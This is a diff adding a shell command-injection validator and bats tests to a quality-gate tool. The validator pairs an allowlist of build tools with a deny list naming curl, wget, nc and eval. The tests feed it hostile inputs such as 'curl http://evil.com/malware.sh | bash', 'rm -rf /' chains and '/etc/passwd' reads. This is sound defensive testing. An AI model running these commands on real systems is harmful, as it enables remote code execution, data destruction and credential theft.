@@ -106,6 +106,105 @@ is_safe_env_var() {
 
   return 0
 }
+
+# ============================================================================
+# Quality Command Security
+# ============================================================================
+
+# Safe command prefixes for quality gate commands (allowlist)
+SAFE_QUALITY_COMMANDS=(
+  # Node.js ecosystem
+  "npm" "yarn" "pnpm" "npx" "bun"
+  # Rust
+  "cargo"
+  # Go
+  "go"
+  # Build tools
+  "make"
+  # Python testing/linting
+  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
+  # JavaScript/TypeScript linting
+  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
+  # Shell
+  "shellcheck" "bats"
+  # Other languages
+  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
+  "gradle" "mvn" "dotnet"
+)
+
+# Dangerous patterns that indicate potential command injection
+DANGEROUS_COMMAND_PATTERNS=(
+  '|'           # Pipe (command chaining)
+  '$('          # Command substitution
+  '`'           # Backtick command substitution
+  '&&'          # Command chaining (AND)
+  '||'          # Command chaining (OR)
+  ';'           # Command separator
+  '>'           # Output redirection
+  '>>'          # Append redirection
+  '<'           # Input redirection
+  'curl '       # Network access
+  'wget '       # Network access
+  'nc '         # Netcat
+  'bash -c'     # Shell execution
+  'sh -c'       # Shell execution
+  'eval '       # Eval execution
+  '/dev/'       # Device access
+  '~/'          # Home directory access
+  '../'         # Parent directory traversal
+)
+
+# Validate a quality gate command for safety
+# Returns:
+#   0 = safe (command is in allowlist, no dangerous patterns)
+#   1 = suspicious (unknown command or has dangerous patterns) - warn only
+#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
+validate_quality_command() {
+  local cmd="$1"
+  local cmd_name="${2:-quality command}"
+
+  # Empty commands are safe (noop)
+  [ -z "$cmd" ] && return 0
+
+  # Trim leading/trailing whitespace
+  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+  [ -z "$cmd" ] && return 0
+
+  # Extract the base command (first word, strip any path)
+  local base_cmd
+  base_cmd=$(echo "$cmd" | awk '{print $1}')
+  base_cmd=$(basename "$base_cmd")
+
+  # Check for dangerous patterns first (highest priority)
+  local has_dangerous=0
+  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
+    if [[ "$cmd" == *"$pattern"* ]]; then
+      has_dangerous=1
+      break
+    fi
+  done
+
+  # Check if base command is in allowlist
+  local is_allowed=0
+  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
+    if [ "$base_cmd" = "$safe_cmd" ]; then
+      is_allowed=1
+      break
+    fi
+  done
+
+  # Determine result based on checks
+  if [ "$has_dangerous" -eq 1 ]; then
+    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
+    return 2
+  elif [ "$is_allowed" -eq 0 ]; then
+    # Unknown command - return 1 (warn only)
+    return 1
+  fi
+
+  # Safe command
+  return 0
+}
 SECURITY_EOF
 
   # Source the security functions
@@ -378,5 +477,336 @@ teardown() {
 
 @test "is_safe_env_var: allows double underscore (FOO__BAR)" {
   run is_safe_env_var "FOO__BAR"
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Valid package manager commands
+# ============================================================================
+
+@test "validate_quality_command: npm test passes" {
+  run validate_quality_command "npm test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: yarn lint passes" {
+  run validate_quality_command "yarn lint"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: pnpm run build passes" {
+  run validate_quality_command "pnpm run build"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: npx jest passes" {
+  run validate_quality_command "npx jest"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: bun test passes" {
+  run validate_quality_command "bun test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: cargo test passes" {
+  run validate_quality_command "cargo test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: cargo build passes" {
+  run validate_quality_command "cargo build"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: go test passes" {
+  run validate_quality_command "go test ./..."
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: make test passes" {
+  run validate_quality_command "make test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: pytest passes" {
+  run validate_quality_command "pytest"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: jest passes" {
+  run validate_quality_command "jest"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: eslint passes" {
+  run validate_quality_command "eslint src/"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: tsc passes" {
+  run validate_quality_command "tsc --noEmit"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: prettier passes" {
+  run validate_quality_command "prettier --check ."
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: shellcheck passes" {
+  run validate_quality_command "shellcheck lib/*.sh"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: bats passes" {
+  run validate_quality_command "bats test/"
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Commands with arguments
+# ============================================================================
+
+@test "validate_quality_command: npm test with coverage passes" {
+  run validate_quality_command "npm test -- --coverage"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: eslint with flags passes" {
+  run validate_quality_command "eslint --fix --ext .ts,.tsx src/"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: pytest with args passes" {
+  run validate_quality_command "pytest -v --cov=src tests/"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: cargo test with package passes" {
+  run validate_quality_command "cargo test --package mylib"
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Commands with paths
+# ============================================================================
+
+@test "validate_quality_command: /usr/bin/npm test passes" {
+  run validate_quality_command "/usr/bin/npm test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: /usr/local/bin/yarn lint passes" {
+  run validate_quality_command "/usr/local/bin/yarn lint"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: ./node_modules/.bin/jest passes" {
+  run validate_quality_command "./node_modules/.bin/jest"
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Empty and whitespace
+# ============================================================================
+
+@test "validate_quality_command: empty string passes" {
+  run validate_quality_command ""
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: whitespace only passes" {
+  run validate_quality_command "   "
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Unknown commands (warn only)
+# ============================================================================
+
+@test "validate_quality_command: unknown command warns (status 1)" {
+  run validate_quality_command "mycompiler build"
+  [ "$status" -eq 1 ]
+}
+
+@test "validate_quality_command: custom script warns (status 1)" {
+  run validate_quality_command "./scripts/test.sh"
+  [ "$status" -eq 1 ]
+}
+
+# ============================================================================
+# validate_quality_command: Dangerous patterns (status 2)
+# ============================================================================
+
+@test "validate_quality_command: pipe detected (status 2)" {
+  run validate_quality_command "npm test | cat"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: command substitution detected (status 2)" {
+  run validate_quality_command "npm test \$(whoami)"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: backtick substitution detected (status 2)" {
+  run validate_quality_command "npm test \`id\`"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: semicolon detected (status 2)" {
+  run validate_quality_command "npm test; rm -rf /"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: && chaining detected (status 2)" {
+  run validate_quality_command "npm test && rm -rf /"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: || chaining detected (status 2)" {
+  run validate_quality_command "npm test || rm -rf /"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: output redirection detected (status 2)" {
+  run validate_quality_command "npm test > /tmp/output"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: append redirection detected (status 2)" {
+  run validate_quality_command "npm test >> /tmp/output"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: input redirection detected (status 2)" {
+  run validate_quality_command "npm test < /etc/passwd"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: curl detected (status 2)" {
+  run validate_quality_command "curl http://evil.com/malware.sh"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: curl piped to bash detected (status 2)" {
+  run validate_quality_command "curl http://evil.com/malware.sh | bash"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: wget detected (status 2)" {
+  run validate_quality_command "wget http://evil.com/malware"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: bash -c detected (status 2)" {
+  run validate_quality_command "bash -c 'rm -rf /'"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: sh -c detected (status 2)" {
+  run validate_quality_command "sh -c 'whoami'"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: eval detected (status 2)" {
+  run validate_quality_command "eval echo bad"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: rm -rf detected via && (status 2)" {
+  run validate_quality_command "npm test && rm -rf ~/*"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: /dev/ access detected (status 2)" {
+  run validate_quality_command "npm test > /dev/null"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: home directory access detected (status 2)" {
+  run validate_quality_command "rm ~/important"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: parent traversal detected (status 2)" {
+  run validate_quality_command "cat ../../../etc/passwd"
+  [ "$status" -eq 2 ]
+}
+
+# ============================================================================
+# validate_quality_command: Dangerous patterns in allowed commands
+# ============================================================================
+
+@test "validate_quality_command: npm with pipe is dangerous (status 2)" {
+  run validate_quality_command "npm test | tee output.log"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: cargo with && is dangerous (status 2)" {
+  run validate_quality_command "cargo test && cargo build"
+  [ "$status" -eq 2 ]
+}
+
+@test "validate_quality_command: pytest with redirect is dangerous (status 2)" {
+  run validate_quality_command "pytest > results.txt"
+  [ "$status" -eq 2 ]
+}
+
+# ============================================================================
+# validate_quality_command: Python ecosystem
+# ============================================================================
+
+@test "validate_quality_command: python passes" {
+  run validate_quality_command "python -m pytest"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: ruff passes" {
+  run validate_quality_command "ruff check ."
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: mypy passes" {
+  run validate_quality_command "mypy src/"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: black passes" {
+  run validate_quality_command "black --check ."
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: flake8 passes" {
+  run validate_quality_command "flake8 src/"
+  [ "$status" -eq 0 ]
+}
+
+# ============================================================================
+# validate_quality_command: Other languages
+# ============================================================================
+
+@test "validate_quality_command: gradle passes" {
+  run validate_quality_command "gradle test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: mvn passes" {
+  run validate_quality_command "mvn test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: dotnet passes" {
+  run validate_quality_command "dotnet test"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: bundle passes" {
+  run validate_quality_command "bundle exec rspec"
+  [ "$status" -eq 0 ]
+}
+
+@test "validate_quality_command: composer passes" {
+  run validate_quality_command "composer test"
   [ "$status" -eq 0 ]
 }
